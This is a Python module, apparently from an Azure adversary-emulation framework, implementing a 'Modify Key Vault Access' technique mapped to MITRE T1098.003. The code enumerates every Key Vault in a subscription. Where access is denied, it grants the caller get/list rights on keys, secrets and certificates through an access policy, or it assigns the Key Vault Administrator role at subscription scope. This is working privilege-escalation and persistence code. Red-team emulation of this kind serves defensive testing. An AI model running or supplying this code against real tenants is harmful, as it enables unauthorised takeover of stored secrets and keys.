import uuid
from typing import Any, Dict, Tuple

import requests
from azure.keyvault.keys import KeyClient
from azure.keyvault.secrets import SecretClient
from azure.mgmt.authorization import AuthorizationManagementClient
from azure.mgmt.authorization.models import RoleAssignmentCreateParameters
from azure.mgmt.keyvault import KeyVaultManagementClient
from azure.mgmt.keyvault.models import (
    AccessPolicyEntry,
    Permissions,
    VaultAccessPolicyParameters,
)

from core.azure.azure_access import AzureAccess

from ..base_technique import (
    AzureTRMTechnique,
    BaseTechnique,
    ExecutionStatus,
    MitreTechnique,
)
from ..technique_registry import TechniqueRegistry


@TechniqueRegistry.register
class AzureModifyKeyVaultAccess(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1098.003",
                technique_name="Account Manipulation",
                tactics=["Persistence", "Privilege Escalation"],
                sub_technique_name="Additional Cloud Roles",
            )
        ]
        azure_trm_technique = [
            AzureTRMTechnique(
                technique_id="AZT405",
                technique_name="Azure AD Application",
                tactics=["Privilege Escalation"],
                sub_technique_name=None,
            )
        ]
        super().__init__(
            "Modify Key Vault Access",
            "Modifies access controls for Azure Key Vaults by attempting to grant the attacker access through both access policies and RBAC roles. If access is denied to a Key Vault, the technique attempts to either add an access policy granting permissions for keys, secrets, and certificates, or attempts to assign the KeyVault Administrator role. This dual-approach technique can be used for privilege escalation and persistence by ensuring continued access to sensitive Key Vault data. The technique systematically enumerates all Key Vaults in the subscription and attempts access modifications on each one, making it effective for discovering and exploiting Key Vaults that may have misconfured permissions.",
            mitre_techniques,
            azure_trm_technique,
        )

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        try:
            # Get credential
            credential = AzureAccess.get_azure_auth_credential()
            # Retrieve subscription id
            current_sub_info = AzureAccess().get_current_subscription_info()
            subscription_id = current_sub_info.get("id")

            # create client
            client = KeyVaultManagementClient(credential, subscription_id)

            token = credential.get_token("https://graph.microsoft.com/.default").token
            headers = {"Authorization": f"Bearer {token}"}
            user_response = requests.get(
                "https://graph.microsoft.com/v1.0/me", headers=headers
            )
            tenant_response = requests.get(
                "https://graph.microsoft.com/v1.0/organization", headers=headers
            )

            # Get user id
            user = user_response.json()
            user_object_id = user["id"]

            # Get tenant id
            tenant = tenant_response.json()
            tenant_id = tenant["value"][0]["id"]

            # Role definition ID for KeyVault Administrator
            role_definition_id = "00482a5a-887f-4fb3-b363-3b7fe8e74483"

            result = {}

            for vault in client.vaults.list():
                vault_name = vault.name
                resource_group_name = vault.id.split("/")[4]
                vault_messages = []

                try:
                    # Check access to secrets and keys
                    secret_client = SecretClient(
                        vault_url=f"https://{vault_name}.vault.azure.net/",
                        credential=credential,
                    )
                    for secret in secret_client.list_properties_of_secrets():
                        secret.name

                    key_client = KeyClient(
                        vault_url=f"https://{vault_name}.vault.azure.net/",
                        credential=credential,
                    )
                    for key in key_client.list_properties_of_keys():
                        key.name
                    vault_messages.append(f"Key Vault {vault_name} ready")

                except Exception as e:
                    if "ForbiddenByPolicy" in str(e) or "AccessDenied" in str(e):
                        try:
                            # Assign access policy if access is denied
                            permissions = Permissions(
                                keys=["get", "list"],
                                secrets=["get", "list"],
                                certificates=["get", "list"],
                            )
                            access_policy = AccessPolicyEntry(
                                tenant_id=tenant_id,
                                object_id=user_object_id,
                                permissions=permissions,
                            )
                            vault = client.vaults.get(resource_group_name, vault_name)
                            vault.properties.access_policies.append(access_policy)
                            parameters = VaultAccessPolicyParameters(
                                properties=vault.properties
                            )
                            client.vaults.update_access_policy(
                                resource_group_name, vault_name, "add", parameters
                            )
                            vault_messages.append(
                                f"Access policy added for {vault_name}"
                            )
                        except Exception as e:
                            vault_messages.append(
                                f"Failed to add access policy for {vault_name}: {e}"
                            )

                    elif "ForbiddenByRbac" in str(e):
                        try:
                            # Assign role if access is forbidden by RBAC
                            auth_client = AuthorizationManagementClient(
                                credential, subscription_id
                            )
                            role_assignment_params = RoleAssignmentCreateParameters(
                                role_definition_id=f"/subscriptions/{subscription_id}/providers/Microsoft.Authorization/roleDefinitions/{role_definition_id}",
                                principal_id=user_object_id,
                            )
                            auth_client.role_assignments.create(
                                scope=f"/subscriptions/{subscription_id}",
                                role_assignment_name=str(uuid.uuid4()),
                                parameters=role_assignment_params,
                            )
                            vault_messages.append(
                                f"KeyVault Administrator role assigned for {vault_name}"
                            )
                        except Exception as e:
                            vault_messages.append(
                                f"Failed to add role for {vault_name}: {e}"
                            )

                result[vault_name] = vault_messages

            return ExecutionStatus.SUCCESS, {
                "message": "Successfully modified key vault access",
                "value": result,
            }
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to modify key vault access",
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {}
